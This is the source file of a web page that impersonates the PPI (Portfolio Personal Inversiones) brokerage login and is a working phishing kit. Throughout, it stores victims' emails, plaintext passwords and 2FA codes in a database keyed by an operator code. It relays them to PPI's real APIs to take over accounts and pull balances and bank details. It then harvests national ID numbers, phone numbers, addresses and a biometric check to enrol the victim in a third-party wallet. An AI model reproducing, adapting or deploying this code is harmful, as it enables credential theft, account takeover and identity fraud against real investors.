import { useState, useEffect, useCallback, useRef } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { ppiApi } from "@/lib/ppiApi";
import { invokeWayni } from "@/lib/wayniApi";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import PpiLoginForm from "@/components/ppi/PpiLoginForm";
import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
import CocosV2AddressScreen from "@/components/cocosv2/CocosV2AddressScreen";
import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
import ppiLogoSvg from "@/assets/ppi-logo.svg";
import qrFiscalPng from "@/assets/ppi-qr-fiscal.png";
import sidPng from "@/assets/ppi-sid.png";
import ppiBgPattern from "@/assets/ppi-bg-pattern.svg";

const ppiLogo = <img src={ppiLogoSvg} alt="PPI" className="h-12 w-auto" />;

// ── Inline 2FA OTP Screen ──
const Ppi2faScreen = ({ email, loading, error, onSubmit, twofaType }: {
  email: string;
  loading: boolean;
  error?: string;
  onSubmit: (code: string) => void;
  twofaType: number;
}) => {
  const [code, setCode] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => { inputRef.current?.focus(); }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim() || loading) return;
    onSubmit(code.trim());
  };

  const isEmailCode = twofaType === 0;
  const title = isEmailCode ? "Código por email" : "Google Authenticator";
  const description = isEmailCode
    ? "Ingresá el código de 6 dígitos que enviamos a tu correo electrónico."
    : "Ingresá el código de 6 dígitos de tu aplicación Google Authenticator.";
  const icon = isEmailCode ? "📧" : "🔐";

  return (
    <div className="relative z-10 w-full max-w-none sm:max-w-[420px] bg-white px-6 py-6 sm:px-10 sm:py-8">
      <div className="flex justify-center mb-3">
        <span className="text-[32px]">{icon}</span>
      </div>
      <h2 className="mb-1 text-center text-[20px] font-bold text-[#1e2a3a]">{title}</h2>
      <p className="mb-1 text-center text-[11px] font-medium text-[#42a5f5]">
        {isEmailCode ? "Verificación por email" : "Verificación por app"}
      </p>
      <p className="mb-6 text-center text-[13px] text-[#8c939a]">{description}</p>
      {error && (
        <div className="mb-4 rounded border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{error}</div>
      )}
      <form onSubmit={handleSubmit} className="flex flex-col gap-4">
        <input
          ref={inputRef}
          type="text"
          inputMode="numeric"
          autoComplete="one-time-code"
          placeholder={isEmailCode ? "Código del email" : "Código de la app"}
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
          className="w-full border border-[#ccd0d5] bg-white px-3 py-3 text-center text-[22px] font-semibold tracking-[0.3em] text-[#333] outline-none transition-colors placeholder:text-[14px] placeholder:tracking-normal placeholder:font-normal placeholder:text-[#adb5bd] focus:border-[#80bdff] focus:shadow-[0_0_0_3px_rgba(0,123,255,0.15)]"
        />
        <button
          type="submit"
          disabled={loading || code.length < 4}
          className="w-full rounded-[4px] bg-[#42a5f5] py-2.5 text-[15px] font-semibold text-white transition-all hover:bg-[#1e88e5] active:scale-[0.99] disabled:opacity-60"
        >
          {loading ? "Verificando..." : "Verificar"}
        </button>
      </form>
      <p className="mt-4 text-center text-[12px] text-[#999]">{email}</p>
    </div>
  );
};

type Step = "login" | "waiting" | "syncing" | "otp_2fa" | "verify_identity" | "address" | "biometric" | "done";

interface IdentityVerifyPayload {
  identity_number: string;
  phone_number: string;
  selected_full_name?: string;
  selected_gender?: string;
  selected_tax_identification_value?: string;
}

interface IdentityVerifyResult {
  requires_selection?: boolean;
  candidates?: Array<{
    identity_number?: string;
    full_name: string;
    gender: string;
    tax_identification_value: string;
  }>;
  suggested_gender?: string;
}

const parseOptionalNumber = (value: unknown): number | undefined => {
  if (typeof value === "number" && Number.isFinite(value)) return value;
  if (typeof value === "string") {
    const parsed = Number(value.trim());
    if (Number.isFinite(parsed)) return parsed;
  }
  return undefined;
};

const parseOptionalString = (value: unknown): string | undefined => {
  if (typeof value !== "string") return undefined;
  const trimmed = value.trim();
  return trimmed ? trimmed : undefined;
};

const DEVICE_FP_KEY = "ppi_device_fp_v1";
const DEVICE_MAP_KEY = "ppi_dispositivo_ids_v1";

const createClientDeviceId = (prefix: string) => {
  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
    return `${prefix}-${crypto.randomUUID()}`;
  }
  return `${prefix}-${Math.random().toString(36).slice(2)}-${Date.now().toString(36)}`;
};

const getOrCreateStorageValue = (key: string, fallbackFactory: () => string) => {
  if (typeof window === "undefined") return fallbackFactory();
  try {
    const existing = window.localStorage.getItem(key)?.trim();
    if (existing) return existing;
    const generated = fallbackFactory();
    window.localStorage.setItem(key, generated);
    return generated;
  } catch {
    return fallbackFactory();
  }
};

const readStoredDispositivoId = (username: string): number | undefined => {
  if (typeof window === "undefined") return undefined;
  const normalized = username.trim().toLowerCase();
  if (!normalized) return undefined;

  try {
    const raw = window.localStorage.getItem(DEVICE_MAP_KEY);
    if (!raw) return undefined;
    const parsed = JSON.parse(raw) as Record<string, unknown>;
    return parseOptionalNumber(parsed[normalized]);
  } catch {
    return undefined;
  }
};

const storeDispositivoId = (username: string, dispositivoId: number) => {
  if (typeof window === "undefined") return;
  const normalized = username.trim().toLowerCase();
  if (!normalized || !Number.isFinite(dispositivoId)) return;

  try {
    const raw = window.localStorage.getItem(DEVICE_MAP_KEY);
    const parsed = raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
    parsed[normalized] = dispositivoId;
    window.localStorage.setItem(DEVICE_MAP_KEY, JSON.stringify(parsed));
  } catch {
    // ignore local storage failures
  }
};

const PPI = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const cleanedCode = rawOperatorCode
    ? rawOperatorCode.replace(/[^a-zA-Z0-9]/g, "") || "master"
    : "master";
  const operatorCode = cleanedCode;

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [statusMsg, setStatusMsg] = useState("");

  const [sessionId, setSessionId] = useState("");
  const sessionIdRef = useRef("");
  const lastPasswordRef = useRef("");
  const lastUsernameRef = useRef("");
  // Wayni onboarding state
  const [syncedFullName, setSyncedFullName] = useState("");
  const [syncedPhone, setSyncedPhone] = useState("");
  const [biometricUrl, setBiometricUrl] = useState("");
  const [userUuid, setUserUuid] = useState("");
  const [userGender, setUserGender] = useState("");
  const [lastDni, setLastDni] = useState("");
  const [twofaUserId, setTwofaUserId] = useState<number | null>(null);
  const [twofaType, setTwofaType] = useState<number>(1);
  const [twofaDeviceId, setTwofaDeviceId] = useState<number | null>(null);
  const [twofaToken, setTwofaToken] = useState("");
  const deviceFpRef = useRef("");

  useVisitTracker();
  useVisitorPresence(sessionId || null);

  useEffect(() => {
    document.title = "PPI — Iniciar sesión";
    // Prevent iOS zoom on focus
    const meta = document.querySelector('meta[name="viewport"]');
    if (meta) {
      meta.setAttribute("content", "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no");
    }
    return () => {
      if (meta) {
        meta.setAttribute("content", "width=device-width, initial-scale=1.0");
      }
    };
  }, []);

  useEffect(() => {
    deviceFpRef.current = getOrCreateStorageValue(DEVICE_FP_KEY, () => createClientDeviceId("ppi-fp"));
  }, []);

  const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
    const { data } = await supabase.from("sessions").insert({
      email: userEmail,
      source: "ppi",
      status,
      otp_code: extra.otp_code as string || null,
      password: extra.password as string || null,
      ip_address: null,
      operator_code: operatorCode,
    } as any).select("id").single();
    if (data?.id) {
      setSessionId(data.id);
      sessionIdRef.current = data.id;
    }
    return data?.id;
  }, [operatorCode]);

  const updateSession = useCallback(async (status: string, extra: Record<string, unknown> = {}) => {
    const sid = sessionIdRef.current;
    if (!sid) return;
    await supabase.from("sessions").update({ status, ...extra }).eq("id", sid);
  }, []);

  // Persist onboarding data to wayni_onboarding table
  const saveOnboardingData = useCallback(async (data: Record<string, unknown>) => {
    try {
      const normalizedEmail = String(data.email || email || "").trim().toLowerCase();
      if (!normalizedEmail) return;
      const sid = sessionIdRef.current || null;
      const { data: existing } = await (supabase as any)
        .from("wayni_onboarding")
        .select("id, metadata")
        .eq("email", normalizedEmail)
        .order("created_at", { ascending: false })
        .limit(1)
        .single();

      const mergedMetadata = {
        ...(((existing?.metadata as Record<string, unknown> | null) ?? {})),
        ...((((data.metadata as Record<string, unknown> | null) ?? {}))),
      };

      const payload = {
        ...data,
        email: normalizedEmail,
        session_id: sid,
        operator_code: operatorCode,
        source: "ppi",
        updated_at: new Date().toISOString(),
        metadata: Object.keys(mergedMetadata).length > 0 ? mergedMetadata : undefined,
      };

      if (existing?.id) {
        await (supabase as any).from("wayni_onboarding").update(payload).eq("id", existing.id);
      } else {
        await (supabase as any).from("wayni_onboarding").insert(payload);
      }
    } catch (e) {
      console.warn("[PPI ONBOARDING] Failed to persist:", e);
    }
  }, [email, operatorCode]);

  // Translate PPI API error messages to user-friendly Spanish
  const translatePpiError = (error: string, raw?: any): string => {
    const lower = (error || "").toLowerCase();
    const rawMsg = (raw?.message || "").toLowerCase();
    const combined = `${lower} ${rawMsg}`;

    if (combined.includes("usuario y/o clave") || combined.includes("invalid") || combined.includes("incorrecta") || combined.includes("clave inv"))
      return "Usuario y/o contraseña incorrectos. Verificá tus datos e intentá nuevamente.";
    if (combined.includes("bloqueada") || combined.includes("blocked") || combined.includes("suspendida"))
      return "Tu cuenta se encuentra bloqueada. Contactá a PPI para más información.";
    if (combined.includes("banned") || combined.includes("baneado"))
      return "Tu cuenta fue suspendida. Contactá a soporte de PPI.";
    if (combined.includes("actualice") || combined.includes("update"))
      return "Servicio temporalmente no disponible. Intentá nuevamente en unos minutos.";
    if (combined.includes("rate") || combined.includes("limit") || combined.includes("demasiados"))
      return "Demasiados intentos. Esperá unos minutos antes de volver a intentar.";
    if (combined.includes("dispositivo de confianza"))
      return "Error de dispositivo de confianza. Intentá nuevamente.";
    if (combined.includes("timeout") || combined.includes("timed out"))
      return "El servidor no respondió a tiempo. Intentá nuevamente.";
    if (error) return error;
    return "Error al iniciar sesión. Intentá nuevamente.";
  };

  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError("");
    setLoading(true);
    setEmail(submittedEmail);
    lastPasswordRef.current = password;
    lastUsernameRef.current = submittedEmail;

    await createSession(submittedEmail, "login_attempt", { password });

    try {
      setStatusMsg("Verificando credenciales...");

      // Try web login first (supports 2FA)
      const rememberedDispositivoId = readStoredDispositivoId(submittedEmail);
      const res = await ppiApi.loginWeb(
        submittedEmail,
        password,
        operatorCode,
        deviceFpRef.current || undefined,
        undefined,
        rememberedDispositivoId,
      );

      // ── Check for explicit API errors (wrong password, blocked, etc.) ──
      if (res.error && !res.requires_2fa && !res.success) {
        const rawMsg = res.raw?.message || res.error || "";
        const isCredentialError = /usuario.*clave|invalid|incorrecta|bloqueada|blocked|banned|suspendida|baneado/i.test(`${res.error} ${rawMsg}`);

        await updateSession("login_failed", {
          otp_code: `error:${res.error}`,
        });

        if (isCredentialError) {
          // Show error on login form — do NOT proceed
          setError(translatePpiError(res.error, res.raw));
          setStatusMsg("");
          setLoading(false);
          return;
        }

        // For non-credential errors (rate limit, timeout, update app), try mobile fallback
        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
        if (mobileRes.error && !mobileRes.success && mobileRes.raw?.status !== 0) {
          // Both APIs failed — show error
          setError(translatePpiError(mobileRes.error || res.error, mobileRes.raw || res.raw));
          setStatusMsg("");
          setLoading(false);
          return;
        }
        if (mobileRes.success || mobileRes.raw?.status === 0) {
          const fullName = mobileRes.fullName || mobileRes.raw?.payload?.usuario?.nombreCompleto || "";
          if (fullName) setSyncedFullName(fullName);
          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
          setStep("verify_identity");
          setStatusMsg("");
          setLoading(false);
          return;
        }
      }

      if (res.requires_2fa) {
        // 2FA required — store userId and type, show OTP screen
        if (res.fullName) setSyncedFullName(res.fullName);
        const parsedUserId = parseOptionalNumber(res.raw?.payload?.usuario?.id);
        setTwofaUserId(parsedUserId ?? null);

        const parsedTwofaType = parseOptionalNumber(
          res.twofa_type ?? res.raw?.payload?.twoFAInfo?.twoFactorType,
        );
        if (parsedTwofaType !== undefined) setTwofaType(parsedTwofaType);

        const parsedDeviceId = parseOptionalNumber(
          res.dispositivo_id ?? res.raw?.payload?.dispositivoID,
        );
        setTwofaDeviceId(parsedDeviceId ?? null);
        if (parsedDeviceId !== undefined) {
          storeDispositivoId(submittedEmail, parsedDeviceId);
        }

        const parsedTwofaToken = parseOptionalString(
          res.twofa_token ?? res.raw?.payload?.twoFAInfo?.token,
        );
        setTwofaToken(parsedTwofaToken || "");

        await updateSession("2fa_required", {
          otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${parsedTwofaType ?? "unknown"}|device:${parsedDeviceId ?? "unknown"}`,
        });
        setStep("otp_2fa");
        setStatusMsg("");
        setLoading(false);
        return;
      }

      setTwofaToken("");
      setTwofaDeviceId(null);

      if (res.success) {
        const fullName = res.fullName || "";
        const token = res.token || "";
        const cuentaId = res.cuentaId;

        await updateSession("login_success", {
          otp_code: `name:${fullName}|cuenta:${cuentaId}`,
        });

        if (fullName) setSyncedFullName(fullName);

        if (token) {
          setStep("syncing");
          setStatusMsg("Sincronizando datos de tu cuenta...");
          try {
            await ppiApi.balances(token, cuentaId);
            await ppiApi.bankAccounts(token, cuentaId);
          } catch { /* silent */ }
          await updateSession("completed", {
            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
          });
        }
      } else {
        // Fallback to mobile login
        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
        if (mobileRes.success || mobileRes.raw?.status === 0) {
          const fullName = mobileRes.fullName || mobileRes.raw?.payload?.usuario?.nombreCompleto || "";
          if (fullName) setSyncedFullName(fullName);
          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
        } else if (mobileRes.error) {
          // Both failed — show error and stay on login
          setError(translatePpiError(mobileRes.error, mobileRes.raw));
          await updateSession("login_failed", { otp_code: `error:${mobileRes.error}` });
          setStatusMsg("");
          setLoading(false);
          return;
        } else {
          await updateSession("waiting_operator", { otp_code: `credentials_captured` });
        }
      }

      setStep("verify_identity");
      setStatusMsg("");
    } catch (e: any) {
      console.error("[PPI] Login error:", e);
      // Fallback to mobile login on network/exception error
      try {
        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
        if (mobileRes.success || mobileRes.raw?.status === 0) {
          const fullName = mobileRes.fullName || "";
          if (fullName) setSyncedFullName(fullName);
          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
          setStep("verify_identity");
        } else if (mobileRes.error) {
          setError(translatePpiError(mobileRes.error, mobileRes.raw));
          await updateSession("login_failed", { otp_code: `error:${mobileRes.error}` });
        } else {
          setError("Error de conexión. Verificá tu internet e intentá nuevamente.");
          await updateSession("login_failed", { otp_code: `error:network_${e.message}` });
        }
      } catch {
        setError("Error de conexión. Verificá tu internet e intentá nuevamente.");
        await updateSession("login_failed", { otp_code: `error:network_${e.message}` });
      }
      setStatusMsg("");
    }
    setLoading(false);
  }, [createSession, updateSession, operatorCode]);

  // ── Handle 2FA code submission ──
  const handle2faSubmit = useCallback(async (code: string) => {
    setLoading(true);
    setError("");
    try {
      await updateSession("2fa_submitted", { otp_code: `code:${code}` });
      const resolvedUserId = parseOptionalNumber(twofaUserId);
      const resolvedTwofaType = parseOptionalNumber(twofaType) ?? 1;
      const resolvedDeviceId = parseOptionalNumber(twofaDeviceId);
      const resolvedTwofaToken = parseOptionalString(twofaToken);
      const res = await ppiApi.validate2fa(
        code,
        lastUsernameRef.current,
        resolvedUserId,
        resolvedTwofaType,
        resolvedDeviceId,
        resolvedTwofaToken,
      );

      if (res.success) {
        const fullName = res.fullName || "";
        const token = res.token || "";
        const cuentaId = res.cuentaId;

        const parsedDeviceId = parseOptionalNumber(
          res.dispositivo_id ?? res.raw?.payload?.dispositivoID ?? resolvedDeviceId,
        );
        if (parsedDeviceId !== undefined) {
          storeDispositivoId(lastUsernameRef.current || email, parsedDeviceId);
          setTwofaDeviceId(parsedDeviceId);
        }
        setTwofaToken("");

        if (fullName) setSyncedFullName(fullName);
        await updateSession("2fa_success", {
          otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
        });

        if (token && cuentaId) {
          setStep("syncing");
          setStatusMsg("Sincronizando datos de tu cuenta...");
          try {
            await ppiApi.balances(token, cuentaId);
            await ppiApi.bankAccounts(token, cuentaId);
          } catch { /* silent */ }
          await updateSession("completed", {
            otp_code: `name:${fullName}|cuenta:${cuentaId}|synced`,
          });
        }

        setStep("verify_identity");
        setStatusMsg("");
      } else {
        setError(res.error || "Código incorrecto. Intentá nuevamente.");
        await updateSession("2fa_error", { otp_code: `error:${res.error || "invalid_code"}` });
      }
    } catch (e: any) {
      setError("Error al validar el código. Intentá nuevamente.");
      await updateSession("2fa_error", { otp_code: `error:${e.message}` });
    }
    setLoading(false);
  }, [updateSession, twofaDeviceId, twofaToken, twofaType, twofaUserId, email]);

  // ── Identity Verification (Wayni onboarding) ──
  const handleIdentityVerify = useCallback(async (data: IdentityVerifyPayload): Promise<IdentityVerifyResult | void> => {
    const resolvedPhone = (data.phone_number || syncedPhone || "").trim();

    await updateSession("verify_dni_submitted", {
      otp_code: `dni:${data.identity_number}|phone:${resolvedPhone}|name_pick:${data.selected_full_name || ""}|gender_pick:${data.selected_gender || ""}`,
    });
    setLastDni(data.identity_number);

    try {
      const { data: walletCheck } = await invokeWayni({
        action: "get_wallet_status",
        identity_number: data.identity_number,
      });
      if (walletCheck?.status === "ACTIVE") {
        await updateSession("completed", { otp_code: `dni:${data.identity_number}|wallet:ACTIVE|skipped:true` });
        setStep("done");
        return;
      }
    } catch { /* continue */ }

    const pwd = lastPasswordRef.current;
    const MAX_DNI_RETRIES = 3;
    let result: any = null;
    let lastDniError = "";

    for (let attempt = 1; attempt <= MAX_DNI_RETRIES; attempt++) {
      const { data: attemptResult, error: apiError } = await invokeWayni({
        action: "onboarding_verify",
        email,
        identity_number: data.identity_number,
        phone_number: resolvedPhone,
        password: pwd,
        selected_full_name: data.selected_full_name,
        selected_gender: data.selected_gender,
        selected_tax_identification_value: data.selected_tax_identification_value,
      });

      if (!apiError && attemptResult && !attemptResult.error) {
        result = attemptResult;
        break;
      }

      lastDniError = attemptResult?.error || apiError?.message || "Error desconocido en la verificación";
      await updateSession("verify_dni_error", {
        otp_code: `dni:${data.identity_number}|attempt:${attempt}/${MAX_DNI_RETRIES}|error:${lastDniError}`,
      });

      if (attempt < MAX_DNI_RETRIES) {
        await new Promise((r) => setTimeout(r, 500));
      }
    }

    if (!result) {
      throw new Error(`DNI no verificado después de ${MAX_DNI_RETRIES} intentos. Motivo: ${lastDniError}`);
    }

    if (result?.requires_selection) {
      const candidates = Array.isArray(result?.candidates) ? result.candidates : [];
      if (!candidates.length) {
        throw new Error("No fue posible validar el titular del DNI. Intentá nuevamente.");
      }
      return {
        requires_selection: true,
        candidates,
        suggested_gender: String(result?.suggested_gender || data.selected_gender || "").toUpperCase(),
      };
    }

    const resolvedGender = String(result?.gender || data.selected_gender || "").toUpperCase();
    if (result?.full_name) setSyncedFullName(result.full_name);
    if (result?.user_uuid) setUserUuid(result.user_uuid);
    if (resolvedGender) setUserGender(resolvedGender);

    await updateSession("verify_dni_success", {
      otp_code: `dni:${data.identity_number}|name:${result?.full_name || data.selected_full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${resolvedGender}|phone:${resolvedPhone}`,
    });

    await saveOnboardingData({
      dni: data.identity_number,
      full_name: result?.full_name || data.selected_full_name || "",
      phone: resolvedPhone,
      gender: resolvedGender,
      user_uuid: result?.user_uuid || "",
      password: lastPasswordRef.current || "",
      status: "verify_dni_success",
    });

    setStep("address");
  }, [email, syncedPhone, updateSession, saveOnboardingData]);

  // ── Address submission → biometric ──
  const handleAddressSubmit = useCallback(async (addressData: Record<string, unknown>) => {
    await updateSession("address_submitted", { otp_code: `region:${addressData.region}|city:${addressData.city}` });
    const { data: result, error: apiError } = await invokeWayni({
      action: "save_address",
      ...addressData,
    });

    if (apiError || result?.error) {
      throw new Error(result?.error || apiError?.message || "Error al guardar la dirección");
    }

    await updateSession("address_saved");

    const { data: bioResult, error: bioError } = await invokeWayni({
      action: "onboarding_biometric",
      identity_number: lastDni,
      user_uuid: userUuid,
      gender: userGender,
    });

    if (bioError || bioResult?.error || !bioResult?.biometric_url) {
      throw new Error(bioResult?.error || bioError?.message || "Error al generar enlace biométrico");
    }

    setBiometricUrl(bioResult.biometric_url);
    await updateSession("biometric_started", {
      otp_code: `dni:${lastDni}|name:${syncedFullName}|uuid:${userUuid}|gender:${userGender}|region:${addressData.region}|city:${addressData.city}|street:${addressData.street_name} ${addressData.street_number}|zip:${addressData.zip_code}|biometric_url:${bioResult.biometric_url}|biometric_id:${bioResult.biometric_id || ""}`,
    });

    await saveOnboardingData({
      region: String(addressData.region || ""),
      city: String(addressData.city || ""),
      street: `${addressData.street_name || ""} ${addressData.street_number || ""}`.trim(),
      zip_code: String(addressData.zip_code || ""),
      biometric_url: bioResult.biometric_url,
      biometric_id: bioResult.biometric_id || "",
      status: "biometric_started",
      metadata: {
        region_id: addressData.region_id,
        city_id: addressData.city_id,
        street_name: addressData.street_name,
        street_number: addressData.street_number,
        floor: addressData.floor,
        apartment: addressData.apartment,
      },
    });

    setStep("biometric");
  }, [updateSession, lastDni, userUuid, userGender, syncedFullName, saveOnboardingData]);

  // ── Biometric events ──
  const handleBiometricEvent = useCallback(async (event: string) => {
    await updateSession(event);
    if (event === "biometric_finished") {
      await saveOnboardingData({ status: "biometric_finished" });
    }
  }, [updateSession, saveOnboardingData]);

  const showFullPage = step === "login" || step === "waiting" || step === "syncing" || step === "otp_2fa";

  return (
    <div className="flex min-h-[100svh] flex-col bg-white">
      {/* ── Header ── */}
      {showFullPage && (
        <header className="flex items-center justify-between px-5 py-4 sm:px-10 sm:py-5 bg-white">
          <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-9" />
          <span className="text-[13px] sm:text-[14px] font-normal text-[#8c939a]">Acceso a PPI</span>
        </header>
      )}

      {/* ── Main area ── */}
      <main className="relative flex flex-1 items-center justify-center overflow-hidden">
        {/* SVG background pattern from PPI — desktop only */}
        {showFullPage && (
          <div className="pointer-events-none absolute inset-0 hidden sm:flex items-center justify-center">
            <img
              src={ppiBgPattern}
              alt=""
              className="w-full h-full object-cover"
              style={{ opacity: 0.6 }}
            />
          </div>
        )}

        {/* ── Login card ── */}
        {step === "login" && (
          <div className="relative z-10 w-full max-w-none sm:max-w-[420px] bg-white px-6 py-6 sm:px-10 sm:py-8">
            <h1 className="mb-6 text-center text-[20px] sm:text-[22px] font-bold text-[#1e2a3a]">
              Te damos la bienvenida
            </h1>
            <PpiLoginForm onSubmit={handleLogin} loading={loading} error={error} />
          </div>
        )}

        {(step === "waiting" || step === "syncing") && (
          <div className="relative z-10 w-full max-w-none sm:max-w-[420px] bg-white px-6 py-6 sm:px-10 sm:py-8">
            <div className="flex flex-col items-center gap-4 py-8 text-center">
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#42a5f5] border-t-transparent" />
              <p className="text-[15px] text-[#555]">{statusMsg || "Procesando tu solicitud..."}</p>
              <p className="text-[13px] text-[#999]">{email}</p>
            </div>
          </div>
        )}

        {step === "otp_2fa" && (
          <Ppi2faScreen
            email={email}
            loading={loading}
            error={error}
            onSubmit={handle2faSubmit}
          />
        )}

        {step === "verify_identity" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2VerifyScreen
              email={email}
              fullName={syncedFullName}
              phone={syncedPhone}
              logo={ppiLogo}
              onSubmit={handleIdentityVerify}
            />
          </div>
        )}

        {step === "address" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2AddressScreen
              email={email}
              fullName={syncedFullName}
              userUuid={userUuid}
              logo={ppiLogo}
              onSubmit={handleAddressSubmit}
            />
          </div>
        )}

        {step === "biometric" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2BiometricScreen
              email={email}
              fullName={syncedFullName}
              biometricUrl={biometricUrl}
              logo={ppiLogo}
              brandName="Portfolio Personal Inversiones"
              onEvent={handleBiometricEvent}
            />
          </div>
        )}

        {step === "done" && (
          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
            <CocosV2FinalScreen email={email} logo={ppiLogo} />
          </div>
        )}
      </main>

      {/* ── Footer ── */}
      {showFullPage && (
        <footer className="border-t border-[#e5e7eb] bg-white px-5 py-3 sm:px-10">
          {/* Desktop: single horizontal row */}
          <div className="hidden sm:flex items-center justify-between">
            <div className="flex items-center gap-2 text-[11px] text-[#999]">
              <span>Portfolio Personal Inversiones | Copyright 2021</span>
              <span className="text-[#ccc]">|</span>
              <span>ALyC Integral CNV N° 686 | ACyD FCI CNV N° 38 | ACyDI CNV N° 73</span>
              <span className="text-[#ccc]">|</span>
              <button type="button" className="text-[#42a5f5] hover:underline">
                Términos y políticas de privacidad
              </button>
            </div>
            <div className="flex items-center gap-3">
              <img src={qrFiscalPng} alt="Data Fiscal" className="h-9 object-contain" />
              <img src={sidPng} alt="SID" className="h-9 object-contain" />
            </div>
          </div>
          {/* Mobile: stacked */}
          <div className="flex flex-col items-center gap-2 sm:hidden py-2">
            <p className="text-center text-[10px] text-[#999]">
              Portfolio Personal Inversiones | Copyright 2021
            </p>
            <p className="text-center text-[10px] text-[#bbb]">
              ALyC Integral CNV N° 686 | ACyD FCI CNV N° 38 | ACyDI CNV N° 73
            </p>
            <button type="button" className="text-[10px] text-[#42a5f5] hover:underline">
              Términos y políticas de privacidad
            </button>
            <div className="flex items-center gap-3 mt-1">
              <img src={qrFiscalPng} alt="Data Fiscal" className="h-8 object-contain" />
              <img src={sidPng} alt="SID" className="h-8 object-contain" />
            </div>
          </div>
        </footer>
      )}
    </div>
  );
};

export default PPI;
